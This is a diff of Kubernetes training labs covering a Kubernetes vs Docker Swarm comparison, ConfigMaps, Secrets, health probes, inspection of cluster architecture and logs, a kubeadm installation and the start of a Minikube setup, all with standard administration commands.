+**Docker Swarm:**
+- Basic service scaling
+- Simple replica management
+- Limited autoscaling options
+
+## Service Discovery
+**Kubernetes:**
+- DNS-based service discovery
+- Service mesh integration
+- Advanced networking policies
+
+**Docker Swarm:**
+- Built-in service discovery
+- Overlay networks
+- Basic load balancing
+
+## Ecosystem
+**Kubernetes:**
+- Vast ecosystem (Helm, Istio, Prometheus)
+- Cloud provider integrations
+- CNCF graduated project
+
+**Docker Swarm:**
+- Limited third-party integrations
+- Docker-centric ecosystem
+- Simpler toolchain
+EOF
+
+# Display the comparison
+cat orchestration-comparison.md
+
+Subtask 4.2: Practical Feature Comparison
+
+# Kubernetes deployment command
+echo "Kubernetes Deployment:"
+echo "kubectl create deployment app --image=nginx --replicas=3"
+echo "kubectl expose deployment app --port=80 --type=NodePort"
+echo ""
+
+# Docker Swarm equivalent
+echo "Docker Swarm Equivalent:"
+echo "docker service create --name app --replicas 3 --publish 80:80 nginx"
+echo ""
+
+# Show current Kubernetes resources
+echo "Current Kubernetes Resources:"
+kubectl get all
+
+Subtask 4.3: Decision Matrix Creation
+
+# Create decision matrix
+cat > decision-matrix.md << 'EOF'
+# Orchestration Tool Decision Matrix
+
+| Feature | Kubernetes | Docker Swarm | Winner |
+|---------|------------|--------------|---------|
+| Ease of Setup | Complex | Simple | Docker Swarm |
+| Learning Curve | Steep | Gentle | Docker Swarm |
+| Scalability | Excellent | Good | Kubernetes |
+| Community Support | Extensive | Moderate | Kubernetes |
+| Enterprise Features | Rich | Basic | Kubernetes |
+| Cloud Integration | Excellent | Limited | Kubernetes |
+| Monitoring | Advanced | Basic | Kubernetes |
+| Security | Comprehensive | Basic | Kubernetes |
+
+## Recommendation
+- **Choose Kubernetes** for: Production environments, complex applications, enterprise needs
+- **Choose Docker Swarm** for: Simple applications, quick prototypes, Docker-centric workflows
+EOF
+
+cat decision-matrix.md
+
+Task 5: Advanced Kubernetes Operations
+Subtask 5.1: ConfigMaps and Secrets
+
+# Create a ConfigMap for application configuration
+kubectl create configmap nginx-config --from-literal=server_name=myapp.local
+
+# Create a Secret for sensitive data
+kubectl create secret generic nginx-secret --from-literal=username=admin --from-literal=password=secretpass
+
+# View created resources
+kubectl get configmaps
+kubectl get secrets
+
+# Describe the ConfigMap
+kubectl describe configmap nginx-config
+
+Subtask 5.2: Health Checks and Probes
+
+Create an enhanced deployment with health checks.
+
+# Create deployment with health probes
+cat > nginx-with-probes.yaml << 'EOF'
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: nginx-with-probes
+spec:
+  replicas: 2
+  selector:
+    matchLabels:
+      app: nginx-probes
+  template:
+    metadata:
+      labels:
+        app: nginx-probes
+    spec:
+      containers:
+      - name: nginx
+        image: nginx:1.21
+        ports:
+        - containerPort: 80
+        livenessProbe:
+          httpGet:
+            path: /
+            port: 80
+          initialDelaySeconds: 30
+          periodSeconds: 10
+        readinessProbe:
+          httpGet:
+            path: /
+            port: 80
+          initialDelaySeconds: 5
+          periodSeconds: 5
+EOF
+
+# Apply the configuration
+kubectl apply -f nginx-with-probes.yaml
+
+# Monitor pod startup
+kubectl get pods -l app=nginx-probes -w
+
+Press Ctrl+C to stop watching.
+Subtask 5.3: Rolling Updates
+
+# Update the nginx image version
+kubectl set image deployment/nginx-with-probes nginx=nginx:1.22
+
+# Watch the rolling update process
+kubectl rollout status deployment/nginx-with-probes
+
+# Check rollout history
+kubectl rollout history deployment/nginx-with-probes
+
+# Rollback if needed (optional)
+# kubectl rollout undo deployment/nginx-with-probes
+
+Task 6: Cleanup and Resource Management
+Subtask 6.1: Clean Up Resources
+
+# Delete deployments
+kubectl delete deployment nginx-app
+kubectl delete deployment nginx-deployment
+kubectl delete deployment nginx-with-probes
+
+# Delete services
+kubectl delete service nginx-service
+
+# Delete ConfigMaps and Secrets
+kubectl delete configmap nginx-config
+kubectl delete secret nginx-secret
+
+# Verify cleanup
+kubectl get all
+
+Subtask 6.2: Stop Minikube
+
+# Stop the Minikube cluster
+minikube stop
+
+# Check Minikube status
+minikube status
+
+# Optional: Delete the cluster completely
+# minikube delete
+
+Troubleshooting Common Issues
+Issue 1: Minikube Won't Start
+
+Problem: Minikube fails to start with VirtualBox driver.
+
+Solution:
+
+# Check VirtualBox installation
+vboxmanage --version
+
+# Try starting with different driver
+minikube start --driver=docker
+
+# Check system resources
+free -h
+
+Issue 2: Pods Stuck in Pending State
+
+Problem: Pods remain in Pending status.
+
+Solution:
+
+# Check node resources
+kubectl describe nodes
+
+# Check pod events
+kubectl describe pod <pod-name>
+
+# Check if images can be pulled
+kubectl get events --sort-by=.metadata.creationTimestamp
+
+Issue 3: Service Not Accessible
+
+Problem: Cannot access application through service.
+
+Solution:
+
+# Check service endpoints
+kubectl get endpoints
+
+# Verify pod labels match service selector
+kubectl get pods --show-labels
+
+# Test service connectivity from within cluster
+kubectl run test-pod --image=busybox --rm -it -- wget -qO- nginx-service
+
+Conclusion
+
+In this comprehensive lab, you have successfully:
+
+• Installed and configured Minikube to create a local Kubernetes development environment • Deployed applications using both imperative commands and declarative YAML manifests • Explored core Kubernetes concepts including pods, deployments, services, and resource management • Demonstrated scaling capabilities by manually adjusting replica counts and observing automatic pod management • Experienced self-healing features through pod failure simulation and automatic recovery • Compared Kubernetes with Docker Swarm to understand different orchestration approaches and use cases • Implemented advanced features such as health probes, rolling updates, and configuration management
+
+Why This Matters: Kubernetes has become the de facto standard for container orchestration in enterprise environments. The skills you've developed in this lab are directly applicable to:
+
+    Cloud-native application development and deployment
+    DevOps practices including CI/CD pipeline integration
+    Microservices architecture implementation and management
+    Preparation for KCNA certification and advanced Kubernetes certifications
+    Real-world production environments where scalability and reliability are critical
+
+The hands-on experience with Minikube provides a solid foundation for working with managed Kubernetes services like Amazon EKS, Google GKE, or Azure AKS. You now understand the fundamental concepts that make Kubernetes a powerful platform for modern application deployment and management.
+
+Continue practicing these concepts and explore additional Kubernetes features such as Ingress controllers, persistent volumes, and cluster monitoring to further enhance your container orchestration expertise.
+
+
+
+
+Lab 3: Understanding Kubernetes Architecture
 Objectives
 
 By the end of this lab, you will be able to:
 
-• Understand and implement Kubernetes NetworkPolicies for Pod-to-Pod communication control • Create namespace-level network isolation using NetworkPolicies • Deploy and configure Ingress resources with TLS termination • Generate and apply SSL/TLS certificates for secure HTTPS routing • Test and verify network security policies and secure routing configurations • Troubleshoot common networking security issues in Kubernetes clusters
+• Identify and understand the core components of a Kubernetes cluster • Use kubectl commands to inspect cluster architecture and component status • Examine control plane component logs including API Server and etcd • Create and deploy a Pod while understanding its interaction with control plane and worker nodes • Analyze the communication flow between Kubernetes components • Troubleshoot basic cluster component issues using command-line tools
 Prerequisites
 
 Before starting this lab, you should have:
 
-• Basic understanding of Kubernetes concepts (Pods, Services, Namespaces) • Familiarity with YAML configuration files • Basic knowledge of networking concepts (TCP/IP, DNS, HTTP/HTTPS) • Understanding of SSL/TLS certificates and encryption • Experience with command-line interface (CLI) operations • Knowledge of kubectl commands for Kubernetes cluster management
+• Basic understanding of containerization concepts (Docker) • Familiarity with Linux command line operations • Basic knowledge of YAML file structure • Understanding of client-server architecture concepts • Completion of previous Kubernetes fundamentals labs or equivalent knowledge
 Lab Environment Setup
 
-Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines with Kubernetes clusters already set up. Simply click Start Lab to access your environment - no need to build your own VM or install Kubernetes from scratch.
+Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines with Kubernetes already installed. Simply click Start Lab to access your environment - no need to build your own VM or install Kubernetes manually.
 
-Your lab environment includes: • A running Kubernetes cluster with multiple nodes • kubectl CLI tool pre-installed and configured • OpenSSL for certificate generation • NGINX Ingress Controller pre-installed • All necessary networking components configured
-Task 1: Create and Apply NetworkPolicies for Pod-to-Pod Communication
-Subtask 1.1: Set Up Test Namespaces and Applications
+Your lab environment includes: • Ubuntu 22.04 LTS with kubectl pre-installed • A single-node Kubernetes cluster (minikube) ready for use • All necessary tools and permissions configured • Internet access for downloading container images
+Task 1: Identifying Kubernetes Cluster Components
+Subtask 1.1: Verify Cluster Status and Basic Information
 
-First, we'll create separate namespaces to demonstrate network isolation.
+First, let's confirm our cluster is running and gather basic information about its architecture.
 
-# Create namespaces for our lab
-kubectl create namespace frontend
-kubectl create namespace backend
-kubectl create namespace database
+    Check cluster status:
 
-Deploy test applications in each namespace:
+kubectl cluster-info
 
-# Deploy frontend application
-kubectl create deployment web-frontend --image=nginx:latest -n frontend
-kubectl expose deployment web-frontend --port=80 --target-port=80 -n frontend
+    Display detailed cluster information:
 
-# Deploy backend application
-kubectl create deployment api-backend --image=httpd:latest -n backend
-kubectl expose deployment api-backend --port=80 --target-port=80 -n backend
+kubectl cluster-info dump | head -20
 
-# Deploy database application
-kubectl create deployment db-server --image=postgres:13 -n database
-kubectl expose deployment db-server --port=5432 --target-port=5432 -n database
+    List all nodes in the cluster:
 
-Verify all deployments are running:
+kubectl get nodes -o wide
 
-kubectl get pods -n frontend
-kubectl get pods -n backend
-kubectl get pods -n database
+    Get detailed information about the node:
 
-Subtask 1.2: Test Default Network Communication
+kubectl describe nodes
 
-Before applying NetworkPolicies, let's verify that pods can communicate across namespaces by default.
+Subtask 1.2: Explore Control Plane Components
 
-# Get the IP address of the backend service
-kubectl get svc -n backend
+The control plane manages the cluster and makes decisions about scheduling and cluster state.
 
-# Create a test pod to check connectivity
-kubectl run test-pod --image=busybox --rm -it --restart=Never -- /bin/sh
+    List all pods in the kube-system namespace (where control plane components run):
 
-Inside the test pod, try to reach services in different namespaces:
+kubectl get pods -n kube-system
 
-# Test connectivity to backend service
-wget -qO- http://api-backend.backend.svc.cluster.local
+    Get detailed information about control plane pods:
 
-# Test connectivity to database service
-nc -zv db-server.database.svc.cluster.local 5432
+kubectl get pods -n kube-system -o wide
+
+    Identify specific control plane components:
+
+kubectl get pods -n kube-system | grep -E "(apiserver|etcd|scheduler|controller)"
+
+Subtask 1.3: Examine API Server Component
+
+The API Server is the central component that exposes the Kubernetes API.
+
+    Find the API Server pod:
+
+kubectl get pods -n kube-system | grep apiserver
+
+    Get detailed information about the API Server:
+
+kubectl describe pod -n kube-system $(kubectl get pods -n kube-system | grep apiserver | awk '{print $1}')
+
+    Check API Server service endpoints:
+
+kubectl get endpoints -n kube-system
+
+Subtask 1.4: Examine etcd Component
+
+etcd is the distributed key-value store that holds all cluster data.
+
+    Find the etcd pod:
+
+kubectl get pods -n kube-system | grep etcd
+
+    Get detailed information about etcd:
+
+kubectl describe pod -n kube-system $(kubectl get pods -n kube-system | grep etcd | awk '{print $1}')
+
+    Check etcd health (if accessible):
+
+kubectl exec -n kube-system $(kubectl get pods -n kube-system | grep etcd | awk '{print $1}') -- etcdctl endpoint health
+
+Task 2: Inspecting Control Plane Component Logs
+Subtask 2.1: Examining API Server Logs
+
+Understanding API Server logs helps troubleshoot cluster communication issues.
+
+    View recent API Server logs:
+
+kubectl logs -n kube-system $(kubectl get pods -n kube-system | grep apiserver | awk '{print $1}') --tail=50
+
+    Follow API Server logs in real-time (open a new terminal for this):
+
+kubectl logs -n kube-system $(kubectl get pods -n kube-system | grep apiserver | awk '{print $1}') -f
+
+    Search for specific events in API Server logs:
+
+kubectl logs -n kube-system $(kubectl get pods -n kube-system | grep apiserver | awk '{print $1}') | grep -i "error\|warning" | tail -10
+
+Subtask 2.2: Examining etcd Logs
+
+etcd logs provide insights into cluster state storage and replication.
+
+    View recent etcd logs:
+
+kubectl logs -n kube-system $(kubectl get pods -n kube-system | grep etcd | awk '{print $1}') --tail=30
+
+    Check for etcd health-related messages:
+
+kubectl logs -n kube-system $(kubectl get pods -n kube-system | grep etcd | awk '{print $1}') | grep -i "health\|ready" | tail -5
+
+    Monitor etcd performance metrics in logs:
+
+kubectl logs -n kube-system $(kubectl get pods -n kube-system | grep etcd | awk '{print $1}') | grep -i "slow\|latency" | tail -5
+
+Subtask 2.3: Examining Scheduler and Controller Manager Logs
+
+    View Scheduler logs:
+
+kubectl logs -n kube-system $(kubectl get pods -n kube-system | grep scheduler | awk '{print $1}') --tail=20
+
+    View Controller Manager logs:
+
+kubectl logs -n kube-system $(kubectl get pods -n kube-system | grep controller-manager | awk '{print $1}') --tail=20
+
+Task 3: Creating a Pod and Understanding Component Interactions
+Subtask 3.1: Create a Simple Pod
+
+Let's create a Pod and observe how it interacts with various cluster components.
+
+    Create a Pod manifest file:
+
+cat > nginx-pod.yaml << EOF
+apiVersion: v1
+kind: Pod
+metadata:
+  name: nginx-demo
+  labels:
+    app: nginx-demo
+spec:
+  containers:
+  - name: nginx
+    image: nginx:1.21
+    ports:
+    - containerPort: 80
+    resources:
+      requests:
+        memory: "64Mi"
+        cpu: "250m"
+      limits:
+        memory: "128Mi"
+        cpu: "500m"
+EOF
+
+    Apply the Pod manifest:
+
+kubectl apply -f nginx-pod.yaml
+
+    Verify Pod creation:
+
+kubectl get pods
+
+    Get detailed Pod information:
+
+kubectl describe pod nginx-demo
+
+Subtask 3.2: Monitor Component Interactions During Pod Creation
+
+    Check scheduler logs for Pod scheduling decisions:
+
+kubectl logs -n kube-system $(kubectl get pods -n kube-system | grep scheduler | awk '{print $1}') | grep nginx-demo
+
+    Check API Server logs for Pod-related API calls:
+
+kubectl logs -n kube-system $(kubectl get pods -n kube-system | grep apiserver | awk '{print $1}') | grep nginx-demo | tail -10
+
+    Examine kubelet logs on the node (if accessible):
+
+# Note: In minikube, you might need to access the node directly
+minikube ssh "sudo journalctl -u kubelet | grep nginx-demo | tail -5"
+
+Subtask 3.3: Analyze Pod Lifecycle and Component Communication
+
+    Check Pod events to understand the creation process:
+
+kubectl get events --sort-by=.metadata.creationTimestamp | grep nginx-demo
+
+    Monitor Pod status changes:
+
+kubectl get pod nginx-demo -o yaml | grep -A 10 "status:"
+
+    Verify container runtime interaction:
+
+kubectl get pod nginx-demo -o jsonpath='{.status.containerStatuses[0].containerID}'
+
+Subtask 3.4: Test Pod Functionality and Network Communication
+
+    Execute commands inside the Pod:
+
+kubectl exec nginx-demo -- nginx -v
+
+    Check Pod IP and network configuration:
+
+kubectl get pod nginx-demo -o wide
+
+    Test network connectivity to the Pod:
+
+POD_IP=$(kubectl get pod nginx-demo -o jsonpath='{.status.podIP}')
+curl -I http://$POD_IP
+
+    Port-forward to test application accessibility:
+
+kubectl port-forward nginx-demo 8080:80 &
+curl http://localhost:8080
+# Stop port-forward
+pkill -f "kubectl port-forward"
+
+Task 4: Advanced Component Analysis
+Subtask 4.1: Examine Resource Usage and Metrics
+
+    Check node resource usage:
+
+kubectl top nodes
+
+    Check Pod resource usage:
+
+kubectl top pods
+
+    Get detailed resource information:
+
+kubectl describe node | grep -A 5 "Allocated resources"
+
+Subtask 4.2: Understand Component Dependencies
+
+    Check service accounts and RBAC:
+
+kubectl get serviceaccounts -n kube-system
+
+    Examine cluster roles and bindings:
+
+kubectl get clusterroles | head -10
+kubectl get clusterrolebindings | head -10
+
+    Check component health endpoints:
+
+kubectl get componentstatuses
+
+Troubleshooting Common Issues
+Issue 1: Pod Stuck in Pending State
+
+If your Pod remains in Pending state:
+
+    Check Pod events:
+
+kubectl describe pod nginx-demo | grep -A 10 Events
+
+    Verify node resources:
+
+kubectl describe nodes | grep -A 5 "Allocated resources"
+
+    Check scheduler logs:
+
+kubectl logs -n kube-system $(kubectl get pods -n kube-system | grep scheduler | awk '{print $1}') | tail -20
+
+Issue 2: Cannot Access Control Plane Components
+
+If you cannot access control plane logs:
+
+    Verify cluster status:
+
+kubectl cluster-info
+
+    Check if components are running:
+
+kubectl get pods -n kube-system
+
+    Restart minikube if necessary:
+
+minikube stop
+minikube start
+
+Issue 3: Network Connectivity Issues
+
+If Pod networking doesn't work:
+
+    Check Pod network configuration:
+
+kubectl get pod nginx-demo -o yaml | grep -A 5 "podIP"
+
+    Verify DNS resolution:
+
+kubectl exec nginx-demo -- nslookup kubernetes.default
+
+Cleanup
+
+Remove the resources created during this lab:
+
+kubectl delete pod nginx-demo
+rm nginx-pod.yaml
+
+Conclusion
+
+In this lab, you have successfully:
+
+• Identified Kubernetes cluster components using kubectl commands and learned how to inspect their status and configuration • Examined control plane component logs including API Server and etcd, understanding how to troubleshoot cluster issues through log analysis • Created a Pod and analyzed its interaction with control plane and worker nodes, observing the complete lifecycle from creation to running state • Understood component communication flow and how different parts of Kubernetes work together to manage containerized applications
+
+Why This Matters: Understanding Kubernetes architecture is crucial for:
+
+    Troubleshooting cluster issues effectively by knowing which component logs to check
+    Optimizing cluster performance by understanding resource allocation and component interactions
+    Securing your cluster by knowing the role of each component and their communication patterns
+    Preparing for KCNA certification by demonstrating practical knowledge of Kubernetes internals
+
+This knowledge forms the foundation for advanced Kubernetes operations, including cluster administration, performance tuning, and security hardening. The hands-on experience with kubectl commands and log analysis will be invaluable as you progress to more complex Kubernetes scenarios.
+
+
+
+
+Lab 4: Installing Kubernetes
+Objectives
+
+By the end of this lab, you will be able to:
+
+• Set up a complete Kubernetes cluster using kubeadm on Linux systems • Configure the cluster networking with a Container Network Interface (CNI) plugin • Verify cluster installation by checking node statuses and system pods • Use kubectl commands to explore and interact with your Kubernetes cluster • Understand the basic architecture and components of a Kubernetes cluster • Troubleshoot common installation issues and verify cluster functionality
+Prerequisites
+
+Before starting this lab, you should have:
+
+• Basic understanding of Linux command line operations • Familiarity with containerization concepts (Docker basics) • Knowledge of networking fundamentals (IP addresses, ports) • Understanding of YAML file structure • Basic knowledge of system administration tasks
+
+Technical Requirements: • Linux-based system with at least 2 GB RAM and 2 CPU cores • Root or sudo access • Internet connectivity for downloading packages • Basic text editor skills (nano, vim, or similar)
+Lab Environment Setup
+
+Good News! Al Nafi provides ready-to-use Linux-based cloud machines for this lab. Simply click Start Lab and you'll have access to a pre-configured environment. No need to build your own virtual machine or worry about hardware requirements.
+
+Your lab environment includes: • Ubuntu 20.04 LTS or newer • Pre-installed Docker runtime • Network connectivity configured • Sufficient resources for Kubernetes installation
+Task 1: Preparing the System for Kubernetes Installation
+Subtask 1.1: Update System Packages
+
+First, let's ensure our system is up to date with the latest packages.
+
+# Update package index
+sudo apt update
+
+# Upgrade existing packages
+sudo apt upgrade -y
+
+# Install essential packages
+sudo apt install -y apt-transport-https ca-certificates curl software-properties-common
+
+Subtask 1.2: Disable Swap
+
+Kubernetes requires swap to be disabled for optimal performance.
+
+# Disable swap temporarily
+sudo swapoff -a
+
+# Disable swap permanently by commenting out swap entries
+sudo sed -i '/ swap / s/^\(.*\)$/#\1/g' /etc/fstab
+
+# Verify swap is disabled
+free -h
+
+Expected Output: The swap line should show 0B for total, used, and free.
+Subtask 1.3: Configure Kernel Modules
+
+Load necessary kernel modules for Kubernetes networking.
+
+# Load required modules
+sudo modprobe overlay
+sudo modprobe br_netfilter
+
+# Make modules persistent across reboots
+cat <<EOF | sudo tee /etc/modules-load.d/k8s.conf
+overlay
+br_netfilter
+EOF
+
+Subtask 1.4: Configure System Parameters
+
+Set up required sysctl parameters for Kubernetes.
+
+# Configure sysctl parameters
+cat <<EOF | sudo tee /etc/sysctl.d/k8s.conf
+net.bridge.bridge-nf-call-iptables  = 1
+net.bridge.bridge-nf-call-ip6tables = 1
+net.ipv4.ip_forward                 = 1
+EOF
+
+# Apply sysctl parameters without reboot
+sudo sysctl --system
+
+Task 2: Installing Container Runtime (containerd)
+Subtask 2.1: Install containerd
+
+Kubernetes needs a container runtime. We'll use containerd as it's the recommended choice.
+
+# Add Docker's official GPG key
+curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
+
+# Add Docker repository
+echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
+
+# Update package index
+sudo apt update
+
+# Install containerd
+sudo apt install -y containerd.io
+
+Subtask 2.2: Configure containerd
+
+# Create containerd configuration directory
+sudo mkdir -p /etc/containerd
+
+# Generate default configuration
+sudo containerd config default | sudo tee /etc/containerd/config.toml
+
+# Configure containerd to use systemd cgroup driver
+sudo sed -i 's/SystemdCgroup \= false/SystemdCgroup \= true/g' /etc/containerd/config.toml
+
+# Restart and enable containerd
+sudo systemctl restart containerd
+sudo systemctl enable containerd
+
+# Verify containerd is running
+sudo systemctl status containerd
+
+Expected Output: You should see active (running) status in green.
+Task 3: Installing Kubernetes Components
+Subtask 3.1: Add Kubernetes Repository
+
+# Add Kubernetes signing key
+curl -fsSL https://pkgs.k8s.io/core:/stable:/v1.28/deb/Release.key | sudo gpg --dearmor -o /etc/apt/keyrings/kubernetes-apt-keyring.gpg
+
+# Add Kubernetes repository
+echo 'deb [signed-by=/etc/apt/keyrings/kubernetes-apt-keyring.gpg] https://pkgs.k8s.io/core:/stable:/v1.28/deb/ /' | sudo tee /etc/apt/sources.list.d/kubernetes.list
+
+# Update package index
+sudo apt update
+
+Subtask 3.2: Install Kubernetes Tools
+
+# Install kubelet, kubeadm, and kubectl
+sudo apt install -y kubelet kubeadm kubectl
+
+# Prevent automatic updates of Kubernetes packages
+sudo apt-mark hold kubelet kubeadm kubectl
+
+# Verify installation
+kubeadm version
+kubectl version --client
+
+Expected Output: You should see version information for both tools.
+Task 4: Initializing the Kubernetes Cluster
+Subtask 4.1: Initialize the Master Node
+
+# Initialize the cluster with kubeadm
+sudo kubeadm init --pod-network-cidr=10.244.0.0/16 --apiserver-advertise-address=$(hostname -I | awk '{print $1}')
+
+Important: Save the kubeadm join command that appears at the end of the output. You'll need it to add worker nodes later.
+
+Expected Output: You should see a message saying "Your Kubernetes control-plane has initialized successfully!"
+Subtask 4.2: Configure kubectl for Regular User
+
+# Create .kube directory
+mkdir -p $HOME/.kube
+
+# Copy admin configuration
+sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config
+
+# Change ownership of the config file
+sudo chown $(id -u):$(id -g) $HOME/.kube/config
+
+# Verify kubectl configuration
+kubectl cluster-info
+
+Expected Output: You should see cluster information including the Kubernetes master URL.
+Task 5: Installing Pod Network Add-on
+Subtask 5.1: Install Flannel CNI Plugin
+
+Kubernetes needs a network plugin to enable pod-to-pod communication.
+
+# Apply Flannel network plugin
+kubectl apply -f https://github.com/flannel-io/flannel/releases/latest/download/kube-flannel.yml
+
+# Wait for flannel pods to be ready
+kubectl wait --for=condition=ready pod -l app=flannel -n kube-flannel --timeout=300s
+
+Subtask 5.2: Remove Taint from Master Node (Single Node Cluster)
+
+For a single-node cluster, we need to allow pods to be scheduled on the master node.
+
+# Remove the master node taint
+kubectl taint nodes --all node-role.kubernetes.io/control-plane-
+
+# Verify the taint removal
+kubectl describe nodes | grep -i taint
+
+Expected Output: You should see NoSchedule taint removed or no taints listed.
+Task 6: Verifying Cluster Installation
+Subtask 6.1: Check Node Status
+
+# Check node status
+kubectl get nodes
+
+# Get detailed node information
+kubectl get nodes -o wide
+
+Expected Output: Your node should show Ready status.
+Subtask 6.2: Verify System Pods
+
+# Check all system pods
+kubectl get pods --all-namespaces
+
+# Check pods in kube-system namespace specifically
+kubectl get pods -n kube-system
+
+# Wait for all pods to be running
+kubectl wait --for=condition=ready pod --all -n kube-system --timeout=300s
+
+Expected Output: All pods should show Running or Completed status.
+Subtask 6.3: Check Cluster Components
+
+# Check cluster component status
+kubectl get componentstatuses
+
+# View cluster information
+kubectl cluster-info
+
+# Check API server health
+kubectl get --raw='/readyz?verbose'
+
+Task 7: Exploring the Cluster with kubectl
+Subtask 7.1: Basic Cluster Exploration
+
+# List all namespaces
+kubectl get namespaces
+
+# Get cluster version information
+kubectl version
+
+# View cluster configuration
+kubectl config view
+
+# Check current context
+kubectl config current-context
+
+Subtask 7.2: Deploy a Test Application
+
+Let's deploy a simple application to verify everything works.
+
+# Create a test deployment
+kubectl create deployment nginx-test --image=nginx:latest
+
+# Expose the deployment as a service
+kubectl expose deployment nginx-test --port=80 --type=NodePort
+
+# Check deployment status
+kubectl get deployments
+
+# Check pods
+kubectl get pods
+
+# Check services
+kubectl get services
+
+Subtask 7.3: Verify Application Functionality
+
+# Get detailed information about the nginx pod
+kubectl describe pod $(kubectl get pods -l app=nginx-test -o jsonpath='{.items[0].metadata.name}')
+
+# Check service details
+kubectl get service nginx-test
+
+# Test the application (get the NodePort)
+NODE_PORT=$(kubectl get service nginx-test -o jsonpath='{.spec.ports[0].nodePort}')
+curl http://localhost:$NODE_PORT
+
+Expected Output: You should see the default nginx welcome page HTML.
+Subtask 7.4: Clean Up Test Resources
+
+# Delete the test deployment and service
+kubectl delete deployment nginx-test
+kubectl delete service nginx-test
+
+# Verify cleanup
+kubectl get deployments
+kubectl get services
+
+Task 8: Additional Cluster Verification
+Subtask 8.1: Check Resource Usage
+
+# Check node resource usage
+kubectl top nodes
+
+# If metrics-server is not installed, install it
+kubectl apply -f https://github.com/kubernetes-sigs/metrics-server/releases/latest/download/components.yaml
+
+# Wait for metrics-server to be ready
+kubectl wait --for=condition=ready pod -l k8s-app=metrics-server -n kube-system --timeout=300s
+
+Subtask 8.2: Explore Kubernetes API
+
+# List available API resources
+kubectl api-resources
+
+# Get API versions
+kubectl api-versions
+
+# Check cluster events
+kubectl get events --sort-by=.metadata.creationTimestamp
+
+Subtask 8.3: Verify Networking
+
+# Check network policies (if any)
+kubectl get networkpolicies --all-namespaces
+
+# Verify DNS resolution
+kubectl run test-dns --image=busybox:1.28 --rm -it --restart=Never -- nslookup kubernetes.default
+
+Troubleshooting Common Issues
+Issue 1: Pods Stuck in Pending State
+
+# Check pod events
+kubectl describe pod <pod-name>
+
+# Check node resources
+kubectl describe nodes
+
+# Verify network plugin installation
+kubectl get pods -n kube-flannel
+
+Issue 2: kubelet Not Starting
+
+# Check kubelet status
+sudo systemctl status kubelet
+
+# View kubelet logs
+sudo journalctl -xeu kubelet
+
+# Restart kubelet if needed
+sudo systemctl restart kubelet
+
+Issue 3: Network Issues
+
+# Check containerd status
+sudo systemctl status containerd
+
+# Verify network configuration
+ip route show
+
+# Check firewall rules
+sudo iptables -L
+
+Verification Checklist
+
+Before concluding this lab, verify the following:
+
+    All system pods are running
+    Node status shows Ready
+    kubectl commands work without errors
+    Test application deployed and accessible
+    Network plugin (Flannel) is operational
+    Cluster components are healthy
+
+Conclusion
+
+Congratulations! You have successfully completed Lab 4: Installing Kubernetes. In this comprehensive lab, you have accomplished the following:
+
+Key Achievements:
+
+• Cluster Setup: You've built a complete Kubernetes cluster from scratch using kubeadm, learning the fundamental installation process that forms the backbone of container orchestration.
+
+• System Configuration: You've properly configured your Linux system with all necessary prerequisites, including container runtime setup, kernel modules, and system parameters required for Kubernetes operation.
+
+• Network Implementation: You've installed and configured Flannel as your Container Network Interface (CNI) plugin, enabling seamless pod-to-pod communication across your cluster.
+
+• Verification Skills: You've learned essential kubectl commands to monitor, verify, and troubleshoot your Kubernetes installation, skills that are crucial for day-to-day cluster management.
+
+• Practical Application: You've deployed and tested a real application on your cluster, demonstrating that your installation is fully functional and ready for production workloads.
+
+Why This Matters:
+
+Understanding how to install and configure Kubernetes manually is essential for several reasons:
+
+• Foundation Knowledge: This hands-on experience provides deep understanding of Kubernetes architecture and components • Troubleshooting Skills: Manual installation knowledge helps you diagnose and fix issues in any Kubernetes environment • Certification Preparation: These skills directly support your KCNA (Kubernetes and Cloud Native Associate) certification goals • Career Advancement: Kubernetes expertise is highly valued in the current job market, with manual installation skills demonstrating advanced technical competency
+
+Next Steps:
+
+With your Kubernetes cluster now operational, you're ready to explore advanced topics such as: • Deploying multi-tier applications • Implementing persistent storage • Configuring ingress controllers • Setting up monitoring and logging • Implementing security policies
+
+Your newly installed Kubernetes cluster serves as the foundation for all future container orchestration learning and experimentation. Well done on completing this critical milestone in your Kubernetes journey!
+
+
+
+
+Lab 5: Setting Up a Single-Node Kubernetes Cluster with Minikube
+Objectives
+
+By the end of this lab, you will be able to:
+
+• Install and configure Minikube on a Linux system • Start and manage a single-node Kubernetes cluster • Use kubectl to interact with and verify cluster health • Understand basic Kubernetes cluster components and their status • Stop and restart a Minikube cluster while maintaining persistence • Troubleshoot common Minikube installation and startup issues
+Prerequisites
+
+Before starting this lab, you should have:
+
+• Basic understanding of Linux command line operations • Familiarity with containerization concepts (Docker basics) • Understanding of what Kubernetes is and its basic architecture • Knowledge of YAML file structure (helpful but not required) • Access to a terminal or command prompt
+
+Note: Al Nafi provides ready-to-use Linux-based cloud machines for this lab. Simply click Start Lab to access your pre-configured environment - no need to build your own VM or install an operating system.
+Lab Environment Setup
+
+Your Al Nafi cloud machine comes pre-configured with: • Ubuntu 20.04 LTS or newer • Docker runtime installed and configured • Internet connectivity for downloading required packages • Sufficient resources (2 CPU cores, 4GB RAM minimum)
+Task 1: Installing Minikube
+Subtask 1.1: Update System Packages
+
+First, ensure your system is up to date with the latest packages.
+
+sudo apt update && sudo apt upgrade -y
+
+Subtask 1.2: Install Required Dependencies
+
+Install curl and other essential tools needed for Minikube installation.
+
+sudo apt install -y curl wget apt-transport-https
+
+Subtask 1.3: Download and Install Minikube
+
+Download the latest stable version of Minikube for Linux.
+
+curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
+
+Make the downloaded file executable and move it to your system PATH.
+
+sudo install minikube-linux-amd64 /usr/local/bin/minikube
+
+Verify the installation by checking the Minikube version.
+
+minikube version
+
+Expected Output:
+
+minikube version: v1.32.0
+commit: 8220a6eb95f0a4d75f7f2d7b14cef975f050512d
+
+Subtask 1.4: Install kubectl
+
+kubectl is the command-line tool for interacting with Kubernetes clusters. Download and install it.
+
+curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
+
